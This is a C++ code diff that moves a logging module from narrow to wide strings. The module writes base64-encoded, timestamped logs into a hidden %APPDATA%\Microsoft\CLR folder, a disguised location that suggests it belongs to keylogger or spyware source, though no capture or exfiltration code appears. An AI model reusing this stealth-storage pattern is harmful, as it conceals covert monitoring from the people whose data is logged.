@@ -12,63 +12,63 @@
 namespace IO
 {
     //gets the path of where the log is going to be stored
-    std::string GetOurPath(const bool append_seperator = false)
+    std::wstring GetOurPath(const bool append_seperator = false)
     {
-		char* buf = nullptr;
+		wchar_t* buf = nullptr;
 		size_t size = 0;
-		errno_t err = _dupenv_s(&buf, &size, "APPDATA");
-        std::string appdata_dir(buf);
-        std::string full = appdata_dir + "\\Microsoft\\CLR";
-        return full + (append_seperator ? "\\" : "");
+		errno_t err = _wdupenv_s(&buf, &size, L"APPDATA");
+        std::wstring appdata_dir(buf);
+        std::wstring full = appdata_dir + L"\\Microsoft\\CLR";
+        return full + (append_seperator ? L"\\" : L"");
 
     }
 
     //creates the directory
-    bool MkOneDr(std::string path)
+    bool MkOneDr(std::wstring path)
     {
-        return (bool)CreateDirectory(path.c_str(), NULL) ||
+        return (bool)CreateDirectoryW(path.c_str(), NULL) ||
         GetLastError() == ERROR_ALREADY_EXISTS;
     }
 
-    bool MKDir(std::string path)
+    bool MKDir(std::wstring path)
     {
-        //this for-loop is using a char pointer to go thru the string
-        for(char &c : path)
+        //this for-loop is using a char pointer to go thru the wstring
+        for(auto &c : path)
         {
-            if(c == '\\')
+            if(c == L'\\')
             {
-                c = '\0';
+                c = L'\0';
                 if(!MkOneDr(path))
                 {
                     return false;
                 }
-                c='\\';
+                c = L'\\';
             }
         }
         return true;
     }
 
     template <class T>
-    std::string WriteLog(const T &t)
+    std::wstring WriteLog(const T &t)
     {
-        std::string path = GetOurPath(true);
+        std::wstring path = GetOurPath(true);
         Helper::DateTime dt;
-        std::string name = dt.GetDateTimeString("_") + ".log";
+        std::wstring name = dt.GetDateTimeString(L"_") + L".log";
         try
         {
-            std::ofstream file(path + name);
+            std::wofstream file(path + name);
             if(!file) 
-				return "";
+				return L"";
 
-            std::ostringstream s;
-            s << "[" << dt.GetDateTimeString() << "]" <<
+            std::wostringstream s;
+            s << L"[" << dt.GetDateTimeString() << L"]" <<
             std::endl << t <<std::endl;
-            std::string data = Encryption::EncryptB64(s.str());
+            std::wstring data = Encryption::EncryptB64(s.str());
             file<<data;
 
             if(!file)
             {
-                return "";
+                return L"";
             }
 
             file.close();
@@ -76,7 +76,7 @@ namespace IO
         }
         catch(...)
         {
-            return "";
+            return L"";
         }
     }
 }
